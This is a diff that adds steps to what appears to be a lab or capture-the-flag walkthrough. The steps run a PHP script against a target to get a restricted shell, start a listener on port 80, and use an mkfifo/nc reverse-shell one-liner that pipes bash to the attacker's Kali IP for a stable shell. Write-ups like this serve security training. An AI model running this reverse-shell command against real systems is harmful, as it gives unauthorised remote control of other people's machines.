@@ -282,6 +282,16 @@ while(1)
 ?>
 ```
 
+#### -Input the above script into a file named "shell.php" on kali machine
+
+#### -Typed "php shell.php 192.168.53.41 /test/" on kali machine and received the below restricted shell:
+
+![](Pasted%20image%2020221111201606.png)
+
+#### -Started penelope listener on kali machine running on port 80
+
+#### -Typed "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 	[kali tun0 IP]:80 >/tmp/f" and received a stable shell:
+
 
 
 ---
